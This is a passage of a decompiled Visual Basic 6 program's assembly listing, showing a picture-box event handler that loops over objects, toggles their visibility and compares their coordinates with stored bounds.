0087DCDE: call 00410A84h ; Set (object)
0087DCE3: mov var_2C, eax
0087DCE6: lea eax, var_28
0087DCE9: push eax
0087DCEA: push 00000003h
0087DCEC: mov eax, var_2C
0087DCEF: mov eax, [eax]
0087DCF1: push var_2C
0087DCF4: call [eax+40h]
0087DCF7: fclex 
0087DCF9: mov var_30, eax
0087DCFC: cmp var_30, 00000000h
0087DD00: jnl 87DD1Ch
0087DD02: push 00000040h
0087DD04: push 00440DE8h
0087DD09: push var_2C
0087DD0C: push var_30
0087DD0F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DD14: mov var_00000104, eax
0087DD1A: jmp 87DD23h
0087DD1C: and var_00000104, 00000000h
0087DD23: mov eax, var_28
0087DD26: mov var_34, eax
0087DD29: mov eax, [ebp+08h]
0087DD2C: fild dword ptr [eax+0000009Ch]
0087DD32: fstp real4 ptr var_00000108
0087DD38: fld real4 ptr var_00000108
0087DD3E: push ecx
0087DD3F: fstp real4 ptr [esp]
0087DD42: mov eax, var_34
0087DD45: mov eax, [eax]
0087DD47: push var_34
0087DD4A: call [eax+7Ch]
0087DD4D: fclex 
0087DD4F: mov var_38, eax
0087DD52: cmp var_38, 00000000h
0087DD56: jnl 87DD72h
0087DD58: push 0000007Ch
0087DD5A: push 00456A8Ch
0087DD5F: push var_34
0087DD62: push var_38
0087DD65: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DD6A: mov var_0000010C, eax
0087DD70: jmp 87DD79h
0087DD72: and var_0000010C, 00000000h
0087DD79: lea eax, var_28
0087DD7C: push eax
0087DD7D: lea eax, var_24
0087DD80: push eax
0087DD81: push 00000002h
0087DD83: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087DD88: add esp, 0000000Ch
0087DD8B: mov var_10, 00000000h
0087DD92: wait 
0087DD93: push 0087DDAEh
0087DD98: jmp 87DDADh
0087DD9A: lea eax, var_28
0087DD9D: push eax
0087DD9E: lea eax, var_24
0087DDA1: push eax
0087DDA2: push 00000002h
0087DDA4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087DDA9: add esp, 0000000Ch
0087DDAC: ret 
End Sub

Private sub pic__87DDCD
0087DDCD: push ebp
0087DDCE: mov ebp, esp
0087DDD0: sub esp, 00000018h
0087DDD3: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087DDD8: mov eax, fs:[00h]
0087DDDE: push eax
0087DDDF: mov fs:[00000000h], esp
0087DDE6: mov eax, 000001C0h
0087DDEB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087DDF0: push ebx
0087DDF1: push esi
0087DDF2: push edi
0087DDF3: mov var_18, esp
0087DDF6: mov var_14, 0040D920h
0087DDFD: mov eax, [ebp+08h]
0087DE00: and eax, 00000001h
0087DE03: mov var_10, eax
0087DE06: mov eax, [ebp+08h]
0087DE09: and al, FEh
0087DE0B: mov [ebp+08h], eax
0087DE0E: mov var_0C, 00000000h
0087DE15: mov eax, [ebp+08h]
0087DE18: mov eax, [eax]
0087DE1A: push [ebp+08h]
0087DE1D: call [eax+04h]
0087DE20: mov var_04, 00000001h
0087DE27: mov var_04, 00000002h
0087DE2E: push FFFFFFFFh
0087DE30: call 00410A60h ; On Error ...
0087DE35: mov var_04, 00000003h
0087DE3C: mov eax, [ebp+08h]
0087DE3F: cmp [eax+000000A0h], 00000000h
0087DE46: jnz 87DE6Bh
0087DE48: mov eax, [ebp+08h]
0087DE4B: add eax, 000000A0h
0087DE50: push eax
0087DE51: push 00440E38h
0087DE56: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087DE5B: mov eax, [ebp+08h]
0087DE5E: add eax, 000000A0h
0087DE63: mov var_0000011C, eax
0087DE69: jmp 87DE79h
0087DE6B: mov eax, [ebp+08h]
0087DE6E: add eax, 000000A0h
0087DE73: mov var_0000011C, eax
0087DE79: mov eax, var_0000011C
0087DE7F: mov eax, [eax]
0087DE81: mov var_000000C8, eax
0087DE87: lea eax, var_000000C4
0087DE8D: push eax
0087DE8E: mov eax, var_000000C8
0087DE94: mov eax, [eax]
0087DE96: push var_000000C8
0087DE9C: call [eax+24h]
0087DE9F: fclex 
0087DEA1: mov var_000000CC, eax
0087DEA7: cmp var_000000CC, 00000000h
0087DEAE: jnl 87DED0h
0087DEB0: push 00000024h
0087DEB2: push 00440E28h
0087DEB7: push var_000000C8
0087DEBD: push var_000000CC
0087DEC3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DEC8: mov var_00000120, eax
0087DECE: jmp 87DED7h
0087DED0: and var_00000120, 00000000h
0087DED7: cmp var_000000C4, 00000000h
0087DEDE: jle 0087E0FAh
0087DEE4: mov var_04, 00000004h
0087DEEB: mov eax, [ebp+08h]
0087DEEE: cmp [eax+000000A0h], 00000000h
0087DEF5: jnz 87DF1Ah
0087DEF7: mov eax, [ebp+08h]
0087DEFA: add eax, 000000A0h
0087DEFF: push eax
0087DF00: push 00440E38h
0087DF05: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087DF0A: mov eax, [ebp+08h]
0087DF0D: add eax, 000000A0h
0087DF12: mov var_00000124, eax
0087DF18: jmp 87DF28h
0087DF1A: mov eax, [ebp+08h]
0087DF1D: add eax, 000000A0h
0087DF22: mov var_00000124, eax
0087DF28: mov eax, var_00000124
0087DF2E: mov eax, [eax]
0087DF30: mov var_000000C8, eax
0087DF36: lea eax, var_000000C4
0087DF3C: push eax
0087DF3D: mov eax, var_000000C8
0087DF43: mov eax, [eax]
0087DF45: push var_000000C8
0087DF4B: call [eax+24h]
0087DF4E: fclex 
0087DF50: mov var_000000CC, eax
0087DF56: cmp var_000000CC, 00000000h
0087DF5D: jnl 87DF7Fh
0087DF5F: push 00000024h
0087DF61: push 00440E28h
0087DF66: push var_000000C8
0087DF6C: push var_000000CC
0087DF72: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DF77: mov var_00000128, eax
0087DF7D: jmp 87DF86h
0087DF7F: and var_00000128, 00000000h
0087DF86: mov eax, var_000000C4
0087DF8C: mov var_000000F0, eax
0087DF92: mov var_000000EC, 00000001h
0087DF9C: mov var_24, 00000001h
0087DFA3: jmp 87DFB7h
0087DFA5: mov eax, var_24
0087DFA8: add eax, var_000000EC
0087DFAE: jo 0087EEFDh
0087DFB4: mov var_24, eax
0087DFB7: mov eax, var_24
0087DFBA: cmp eax, var_000000F0
0087DFC0: jnle 0087E0C6h
0087DFC6: mov var_04, 00000005h
0087DFCD: or var_000000A4, FFFFFFFFh
0087DFD4: mov var_000000AC, 0000000Bh
0087DFDE: mov eax, [ebp+08h]
0087DFE1: cmp [eax+000000A0h], 00000000h
0087DFE8: jnz 87E00Dh
0087DFEA: mov eax, [ebp+08h]
0087DFED: add eax, 000000A0h
0087DFF2: push eax
0087DFF3: push 00440E38h
0087DFF8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087DFFD: mov eax, [ebp+08h]
0087E000: add eax, 000000A0h
0087E005: mov var_0000012C, eax
0087E00B: jmp 87E01Bh
0087E00D: mov eax, [ebp+08h]
0087E010: add eax, 000000A0h
0087E015: mov var_0000012C, eax
0087E01B: mov eax, var_0000012C
0087E021: mov eax, [eax]
0087E023: mov var_000000C8, eax
0087E029: lea eax, var_24
0087E02C: mov var_00000094, eax
0087E032: mov var_0000009C, 00004003h
0087E03C: lea eax, var_5C
0087E03F: push eax
0087E040: lea eax, var_0000009C
0087E046: push eax
0087E047: mov eax, var_000000C8
0087E04D: mov eax, [eax]
0087E04F: push var_000000C8
0087E055: call [eax+1Ch]
0087E058: fclex 
0087E05A: mov var_000000CC, eax
0087E060: cmp var_000000CC, 00000000h
0087E067: jnl 87E089h
0087E069: push 0000001Ch
0087E06B: push 00440E28h
0087E070: push var_000000C8
0087E076: push var_000000CC
0087E07C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E081: mov var_00000130, eax
0087E087: jmp 87E090h
0087E089: and var_00000130, 00000000h
0087E090: push 00000010h
0087E092: pop eax
0087E093: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087E098: lea esi, var_000000AC
0087E09E: mov edi, esp
0087E0A0: movsd 
0087E0A1: movsd 
0087E0A2: movsd 
0087E0A3: movsd 
0087E0A4: push 00457C44h ; Visible
0087E0A9: lea eax, var_5C
0087E0AC: push eax
0087E0AD: call 0041087Ah ; msvbvm60.dll.__vbaVarLateMemSt
0087E0B2: lea ecx, var_5C
0087E0B5: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0087E0BA: mov var_04, 00000006h
0087E0C1: jmp 0087DFA5h
0087E0C6: mov var_04, 00000007h
0087E0CD: push 00440E28h
0087E0D2: push 00000000h
0087E0D4: call 00410A06h ; msvbvm60.dll.__vbaCastObj
0087E0D9: push eax
0087E0DA: lea eax, var_30
0087E0DD: push eax
0087E0DE: call 00410A84h ; Set (object)
0087E0E3: push eax
0087E0E4: mov eax, [ebp+08h]
0087E0E7: add eax, 000000A0h
0087E0EC: push eax
0087E0ED: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087E0F2: lea ecx, var_30
0087E0F5: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087E0FA: mov var_04, 00000009h
0087E101: mov eax, [ebp+08h]
0087E104: mov eax, [eax]
0087E106: push [ebp+08h]
0087E109: call [eax+00000308h]
0087E10F: push eax
0087E110: lea eax, var_30
0087E113: push eax
0087E114: call 00410A84h ; Set (object)
0087E119: mov var_000000C8, eax
0087E11F: lea eax, var_000000C0
0087E125: push eax
0087E126: mov eax, var_000000C8
0087E12C: mov eax, [eax]
0087E12E: push var_000000C8
0087E134: call [eax+48h]
0087E137: fclex 
0087E139: mov var_000000CC, eax
0087E13F: cmp var_000000CC, 00000000h
0087E146: jnl 87E168h
0087E148: push 00000048h
0087E14A: push 00440DE8h
0087E14F: push var_000000C8
0087E155: push var_000000CC
0087E15B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E160: mov var_00000134, eax
0087E166: jmp 87E16Fh
0087E168: and var_00000134, 00000000h
0087E16F: movsx eax, word ptr var_000000C0
0087E176: mov var_000000F8, eax
0087E17C: mov var_000000F4, 00000001h
0087E186: mov var_24, 00000001h
0087E18D: lea ecx, var_30
0087E190: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087E195: jmp 87E1A9h
0087E197: mov eax, var_24
0087E19A: add eax, var_000000F4
0087E1A0: jo 0087EEFDh
0087E1A6: mov var_24, eax
0087E1A9: mov eax, var_24
0087E1AC: cmp eax, var_000000F8
0087E1B2: jnle 0087EA88h
0087E1B8: mov var_04, 0000000Ah
0087E1BF: mov eax, [ebp+08h]
0087E1C2: mov eax, [eax]
0087E1C4: push [ebp+08h]
0087E1C7: call [eax+00000308h]
0087E1CD: push eax
0087E1CE: lea eax, var_30
0087E1D1: push eax
0087E1D2: call 00410A84h ; Set (object)
0087E1D7: mov var_000000C8, eax
0087E1DD: lea eax, var_34
0087E1E0: push eax
0087E1E1: mov ecx, var_24
0087E1E4: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E1E9: push eax
0087E1EA: mov eax, var_000000C8
0087E1F0: mov eax, [eax]
0087E1F2: push var_000000C8
0087E1F8: call [eax+40h]
0087E1FB: fclex 
0087E1FD: mov var_000000CC, eax
0087E203: cmp var_000000CC, 00000000h
0087E20A: jnl 87E22Ch
0087E20C: push 00000040h
0087E20E: push 00440DE8h
0087E213: push var_000000C8
0087E219: push var_000000CC
0087E21F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E224: mov var_00000138, eax
0087E22A: jmp 87E233h
0087E22C: and var_00000138, 00000000h
0087E233: push 00000000h
0087E235: push 80010003h
0087E23A: push var_34
0087E23D: lea eax, var_5C
0087E240: push eax
0087E241: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E246: add esp, 00000010h
0087E249: push eax
0087E24A: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E24F: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E254: mov eax, [ebp+08h]
0087E257: fild dword ptr [eax+00000090h]
0087E25D: fstp real8 ptr var_00000140
0087E263: fcomp real8 ptr var_00000140
0087E269: fstsw ax
0087E26B: sahf 
0087E26C: jbe 87E27Ah
0087E26E: mov var_00000144, 00000001h
0087E278: jmp 87E281h
0087E27A: and var_00000144, 00000000h
0087E281: mov eax, [ebp+08h]
0087E284: mov eax, [eax]
0087E286: push [ebp+08h]
0087E289: call [eax+00000308h]
0087E28F: push eax
0087E290: lea eax, var_38
0087E293: push eax
0087E294: call 00410A84h ; Set (object)
0087E299: mov var_000000D0, eax
0087E29F: lea eax, var_3C
0087E2A2: push eax
0087E2A3: mov ecx, var_24
0087E2A6: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E2AB: push eax
0087E2AC: mov eax, var_000000D0
0087E2B2: mov eax, [eax]
0087E2B4: push var_000000D0
0087E2BA: call [eax+40h]
0087E2BD: fclex 
0087E2BF: mov var_000000D4, eax
0087E2C5: cmp var_000000D4, 00000000h
0087E2CC: jnl 87E2EEh
0087E2CE: push 00000040h
0087E2D0: push 00440DE8h
0087E2D5: push var_000000D0
0087E2DB: push var_000000D4
0087E2E1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E2E6: mov var_00000148, eax
0087E2EC: jmp 87E2F5h
0087E2EE: and var_00000148, 00000000h
0087E2F5: push 00000000h
0087E2F7: push 80010003h
0087E2FC: push var_3C
0087E2FF: lea eax, var_6C
0087E302: push eax
0087E303: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E308: add esp, 00000010h
0087E30B: push eax
0087E30C: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E311: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E316: mov eax, [ebp+08h]
0087E319: fild dword ptr [eax+00000094h]
0087E31F: fstp real8 ptr var_00000150
0087E325: fcomp real8 ptr var_00000150
0087E32B: fstsw ax
0087E32D: sahf 
0087E32E: jnb 87E33Ch
0087E330: mov var_00000154, 00000001h
0087E33A: jmp 87E343h
0087E33C: and var_00000154, 00000000h
0087E343: mov eax, [ebp+08h]
0087E346: mov eax, [eax]
0087E348: push [ebp+08h]
0087E34B: call [eax+00000308h]
0087E351: push eax
0087E352: lea eax, var_40
0087E355: push eax
0087E356: call 00410A84h ; Set (object)
0087E35B: mov var_000000D8, eax
0087E361: lea eax, var_44
0087E364: push eax
0087E365: mov ecx, var_24
0087E368: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E36D: push eax
0087E36E: mov eax, var_000000D8
0087E374: mov eax, [eax]
0087E376: push var_000000D8
0087E37C: call [eax+40h]
0087E37F: fclex 
0087E381: mov var_000000DC, eax
0087E387: cmp var_000000DC, 00000000h
0087E38E: jnl 87E3B0h
0087E390: push 00000040h
0087E392: push 00440DE8h
0087E397: push var_000000D8
0087E39D: push var_000000DC
0087E3A3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E3A8: mov var_00000158, eax
0087E3AE: jmp 87E3B7h
0087E3B0: and var_00000158, 00000000h
0087E3B7: push 00000000h
0087E3B9: push 80010003h
0087E3BE: push var_44
0087E3C1: lea eax, var_7C
0087E3C4: push eax
0087E3C5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E3CA: add esp, 00000010h
0087E3CD: push eax
0087E3CE: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E3D3: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E3D8: mov eax, [ebp+08h]
0087E3DB: fild dword ptr [eax+00000094h]
0087E3E1: fstp real8 ptr var_00000160
0087E3E7: fcomp real8 ptr var_00000160
0087E3ED: fstsw ax
0087E3EF: sahf 
0087E3F0: jbe 87E3FEh
0087E3F2: mov var_00000164, 00000001h
0087E3FC: jmp 87E405h
0087E3FE: and var_00000164, 00000000h
0087E405: mov eax, [ebp+08h]
0087E408: mov eax, [eax]
0087E40A: push [ebp+08h]
0087E40D: call [eax+00000308h]
0087E413: push eax
0087E414: lea eax, var_48
0087E417: push eax
0087E418: call 00410A84h ; Set (object)
0087E41D: mov var_000000E0, eax
0087E423: lea eax, var_4C
0087E426: push eax
0087E427: mov ecx, var_24
0087E42A: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E42F: push eax
0087E430: mov eax, var_000000E0
0087E436: mov eax, [eax]
0087E438: push var_000000E0
0087E43E: call [eax+40h]
0087E441: fclex 
0087E443: mov var_000000E4, eax
0087E449: cmp var_000000E4, 00000000h
0087E450: jnl 87E472h
0087E452: push 00000040h
0087E454: push 00440DE8h
0087E459: push var_000000E0
0087E45F: push var_000000E4
0087E465: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E46A: mov var_00000168, eax
0087E470: jmp 87E479h
0087E472: and var_00000168, 00000000h
0087E479: push 00000000h
0087E47B: push 80010003h
0087E480: push var_4C
0087E483: lea eax, var_0000008C
0087E489: push eax
0087E48A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E48F: add esp, 00000010h
0087E492: push eax
0087E493: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E498: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E49D: mov eax, [ebp+08h]
0087E4A0: fild dword ptr [eax+00000090h]
0087E4A6: fstp real8 ptr var_00000170
0087E4AC: fcomp real8 ptr var_00000170
0087E4B2: fstsw ax
0087E4B4: sahf 
0087E4B5: jnb 87E4C3h
0087E4B7: mov var_00000174, 00000001h
0087E4C1: jmp 87E4CAh
0087E4C3: and var_00000174, 00000000h
0087E4CA: mov eax, var_00000144
0087E4D0: neg eax
0087E4D2: mov ecx, var_00000154
0087E4D8: neg ecx
0087E4DA: and ax, cx
0087E4DD: mov ecx, var_00000164
0087E4E3: neg ecx
0087E4E5: mov edx, var_00000174
0087E4EB: neg edx
0087E4ED: and cx, dx
0087E4F0: or ax, cx
0087E4F3: mov var_000000E8, ax
0087E4FA: lea eax, var_4C
0087E4FD: push eax
0087E4FE: lea eax, var_48
0087E501: push eax
0087E502: lea eax, var_44
0087E505: push eax
0087E506: lea eax, var_40
0087E509: push eax
0087E50A: lea eax, var_3C
0087E50D: push eax
0087E50E: lea eax, var_38
0087E511: push eax
0087E512: lea eax, var_34
0087E515: push eax
0087E516: lea eax, var_30
0087E519: push eax
0087E51A: push 00000008h
0087E51C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087E521: add esp, 00000024h
0087E524: lea eax, var_0000008C
0087E52A: push eax
0087E52B: lea eax, var_7C
0087E52E: push eax
0087E52F: lea eax, var_6C
0087E532: push eax
0087E533: lea eax, var_5C
0087E536: push eax
0087E537: push 00000004h
0087E539: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087E53E: add esp, 00000014h
0087E541: movsx eax, word ptr var_000000E8
0087E548: test eax, eax
0087E54A: jz 0087EA7Ch
0087E550: mov var_04, 0000000Bh
0087E557: mov eax, [ebp+08h]
0087E55A: mov eax, [eax]
0087E55C: push [ebp+08h]
0087E55F: call [eax+00000308h]
0087E565: push eax
0087E566: lea eax, var_30
0087E569: push eax
0087E56A: call 00410A84h ; Set (object)
0087E56F: mov var_000000C8, eax
0087E575: lea eax, var_34
0087E578: push eax
0087E579: mov ecx, var_24
0087E57C: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E581: push eax
0087E582: mov eax, var_000000C8
0087E588: mov eax, [eax]
0087E58A: push var_000000C8
0087E590: call [eax+40h]
0087E593: fclex 
0087E595: mov var_000000CC, eax
0087E59B: cmp var_000000CC, 00000000h
0087E5A2: jnl 87E5C4h
0087E5A4: push 00000040h
0087E5A6: push 00440DE8h
0087E5AB: push var_000000C8
0087E5B1: push var_000000CC
0087E5B7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E5BC: mov var_00000178, eax
0087E5C2: jmp 87E5CBh
0087E5C4: and var_00000178, 00000000h
0087E5CB: push 00000000h
0087E5CD: push 80010004h
0087E5D2: push var_34
0087E5D5: lea eax, var_5C
0087E5D8: push eax
0087E5D9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E5DE: add esp, 00000010h
0087E5E1: push eax
0087E5E2: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E5E7: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E5EC: mov eax, [ebp+08h]
0087E5EF: fild dword ptr [eax+00000098h]
0087E5F5: fstp real8 ptr var_00000180
0087E5FB: fcomp real8 ptr var_00000180
0087E601: fstsw ax
0087E603: sahf 
0087E604: jbe 87E612h
0087E606: mov var_00000184, 00000001h
0087E610: jmp 87E619h
0087E612: and var_00000184, 00000000h
0087E619: mov eax, [ebp+08h]
0087E61C: mov eax, [eax]
0087E61E: push [ebp+08h]
0087E621: call [eax+00000308h]
0087E627: push eax
0087E628: lea eax, var_38
0087E62B: push eax
0087E62C: call 00410A84h ; Set (object)
0087E631: mov var_000000D0, eax
0087E637: lea eax, var_3C
0087E63A: push eax
0087E63B: mov ecx, var_24
0087E63E: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E643: push eax
0087E644: mov eax, var_000000D0
0087E64A: mov eax, [eax]
0087E64C: push var_000000D0
0087E652: call [eax+40h]
0087E655: fclex 
0087E657: mov var_000000D4, eax
0087E65D: cmp var_000000D4, 00000000h
0087E664: jnl 87E686h
0087E666: push 00000040h
0087E668: push 00440DE8h
0087E66D: push var_000000D0
0087E673: push var_000000D4
0087E679: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E67E: mov var_00000188, eax
0087E684: jmp 87E68Dh
0087E686: and var_00000188, 00000000h
0087E68D: push 00000000h
0087E68F: push 80010004h
0087E694: push var_3C
0087E697: lea eax, var_6C
0087E69A: push eax
0087E69B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E6A0: add esp, 00000010h
0087E6A3: push eax
0087E6A4: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E6A9: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E6AE: mov eax, [ebp+08h]
0087E6B1: fild dword ptr [eax+0000009Ch]
0087E6B7: fstp real8 ptr var_00000190
0087E6BD: fcomp real8 ptr var_00000190
0087E6C3: fstsw ax
0087E6C5: sahf 
0087E6C6: jnb 87E6D4h
0087E6C8: mov var_00000194, 00000001h
0087E6D2: jmp 87E6DBh
0087E6D4: and var_00000194, 00000000h
0087E6DB: mov eax, [ebp+08h]
0087E6DE: mov eax, [eax]
0087E6E0: push [ebp+08h]
0087E6E3: call [eax+00000308h]
0087E6E9: push eax
0087E6EA: lea eax, var_40
0087E6ED: push eax
0087E6EE: call 00410A84h ; Set (object)
0087E6F3: mov var_000000D8, eax
0087E6F9: lea eax, var_44
0087E6FC: push eax
0087E6FD: mov ecx, var_24
0087E700: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E705: push eax
0087E706: mov eax, var_000000D8
0087E70C: mov eax, [eax]
0087E70E: push var_000000D8
0087E714: call [eax+40h]
0087E717: fclex 
0087E719: mov var_000000DC, eax
0087E71F: cmp var_000000DC, 00000000h
0087E726: jnl 87E748h
0087E728: push 00000040h
0087E72A: push 00440DE8h
0087E72F: push var_000000D8
0087E735: push var_000000DC
0087E73B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E740: mov var_00000198, eax
0087E746: jmp 87E74Fh
0087E748: and var_00000198, 00000000h
0087E74F: push 00000000h
0087E751: push 80010004h
0087E756: push var_44
0087E759: lea eax, var_7C
0087E75C: push eax
0087E75D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E762: add esp, 00000010h
0087E765: push eax
0087E766: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E76B: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E770: mov eax, [ebp+08h]
0087E773: fild dword ptr [eax+0000009Ch]
0087E779: fstp real8 ptr var_000001A0
0087E77F: fcomp real8 ptr var_000001A0
0087E785: fstsw ax
0087E787: sahf 
0087E788: jbe 87E796h
0087E78A: mov var_000001A4, 00000001h
0087E794: jmp 87E79Dh
0087E796: and var_000001A4, 00000000h
0087E79D: mov eax, [ebp+08h]
0087E7A0: mov eax, [eax]
0087E7A2: push [ebp+08h]
0087E7A5: call [eax+00000308h]
0087E7AB: push eax
0087E7AC: lea eax, var_48
0087E7AF: push eax
0087E7B0: call 00410A84h ; Set (object)
0087E7B5: mov var_000000E0, eax
0087E7BB: lea eax, var_4C
0087E7BE: push eax
0087E7BF: mov ecx, var_24
0087E7C2: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E7C7: push eax
0087E7C8: mov eax, var_000000E0
0087E7CE: mov eax, [eax]
0087E7D0: push var_000000E0
0087E7D6: call [eax+40h]
0087E7D9: fclex 
0087E7DB: mov var_000000E4, eax
0087E7E1: cmp var_000000E4, 00000000h
0087E7E8: jnl 87E80Ah
0087E7EA: push 00000040h
0087E7EC: push 00440DE8h
0087E7F1: push var_000000E0
0087E7F7: push var_000000E4
0087E7FD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E802: mov var_000001A8, eax
0087E808: jmp 87E811h
0087E80A: and var_000001A8, 00000000h
0087E811: push 00000000h
0087E813: push 80010004h
0087E818: push var_4C
0087E81B: lea eax, var_0000008C
0087E821: push eax
0087E822: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0087E827: add esp, 00000010h
0087E82A: push eax
0087E82B: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0087E830: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087E835: mov eax, [ebp+08h]
0087E838: fild dword ptr [eax+00000098h]
0087E83E: fstp real8 ptr var_000001B0
0087E844: fcomp real8 ptr var_000001B0
0087E84A: fstsw ax
0087E84C: sahf 
0087E84D: jnb 87E85Bh
0087E84F: mov var_000001B4, 00000001h
0087E859: jmp 87E862h
0087E85B: and var_000001B4, 00000000h
0087E862: mov eax, var_00000184
0087E868: neg eax
0087E86A: mov ecx, var_00000194
0087E870: neg ecx
0087E872: and ax, cx
0087E875: mov ecx, var_000001A4
0087E87B: neg ecx
0087E87D: mov edx, var_000001B4
0087E883: neg edx
0087E885: and cx, dx
0087E888: or ax, cx
0087E88B: mov var_000000E8, ax
0087E892: lea eax, var_4C
0087E895: push eax
0087E896: lea eax, var_48
0087E899: push eax
0087E89A: lea eax, var_44
0087E89D: push eax
0087E89E: lea eax, var_40
0087E8A1: push eax
0087E8A2: lea eax, var_3C
0087E8A5: push eax
0087E8A6: lea eax, var_38
0087E8A9: push eax
0087E8AA: lea eax, var_34
0087E8AD: push eax
0087E8AE: lea eax, var_30
0087E8B1: push eax
0087E8B2: push 00000008h
0087E8B4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087E8B9: add esp, 00000024h
0087E8BC: lea eax, var_0000008C
0087E8C2: push eax
0087E8C3: lea eax, var_7C
0087E8C6: push eax
0087E8C7: lea eax, var_6C
0087E8CA: push eax
0087E8CB: lea eax, var_5C
0087E8CE: push eax
0087E8CF: push 00000004h
0087E8D1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087E8D6: add esp, 00000014h
0087E8D9: movsx eax, word ptr var_000000E8
0087E8E0: test eax, eax
0087E8E2: jz 0087EA7Ch
0087E8E8: mov var_04, 0000000Ch
0087E8EF: mov eax, [ebp+08h]
0087E8F2: cmp [eax+000000A0h], 00000000h
0087E8F9: jnz 87E91Eh
0087E8FB: mov eax, [ebp+08h]
0087E8FE: add eax, 000000A0h
0087E903: push eax
0087E904: push 00440E38h
0087E909: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087E90E: mov eax, [ebp+08h]
0087E911: add eax, 000000A0h
0087E916: mov var_000001B8, eax
0087E91C: jmp 87E92Ch
0087E91E: mov eax, [ebp+08h]
0087E921: add eax, 000000A0h
0087E926: mov var_000001B8, eax
0087E92C: mov eax, var_000001B8
0087E932: mov eax, [eax]
0087E934: mov var_000000D0, eax
0087E93A: mov var_00000084, 80020004h
0087E944: mov var_0000008C, 0000000Ah
0087E94E: mov var_74, 80020004h
0087E955: mov var_7C, 0000000Ah
0087E95C: mov var_64, 80020004h
0087E963: mov var_6C, 0000000Ah
0087E96A: mov eax, [ebp+08h]
0087E96D: mov eax, [eax]
0087E96F: push [ebp+08h]
0087E972: call [eax+00000308h]
0087E978: push eax
0087E979: lea eax, var_30
0087E97C: push eax
0087E97D: call 00410A84h ; Set (object)
0087E982: mov var_000000C8, eax
0087E988: lea eax, var_34
0087E98B: push eax
0087E98C: mov ecx, var_24
0087E98F: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087E994: push eax
0087E995: mov eax, var_000000C8
0087E99B: mov eax, [eax]
0087E99D: push var_000000C8
0087E9A3: call [eax+40h]
0087E9A6: fclex 
0087E9A8: mov var_000000CC, eax
0087E9AE: cmp var_000000CC, 00000000h
0087E9B5: jnl 87E9D7h
0087E9B7: push 00000040h
0087E9B9: push 00440DE8h
0087E9BE: push var_000000C8
0087E9C4: push var_000000CC
0087E9CA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087E9CF: mov var_000001BC, eax
0087E9D5: jmp 87E9DEh
0087E9D7: and var_000001BC, 00000000h
0087E9DE: mov eax, var_34
0087E9E1: mov var_00000118, eax
0087E9E7: and var_34, 00000000h
0087E9EB: mov eax, var_00000118
0087E9F1: mov var_54, eax
0087E9F4: mov var_5C, 00000009h
0087E9FB: lea eax, var_0000008C
0087EA01: push eax
0087EA02: lea eax, var_7C
0087EA05: push eax
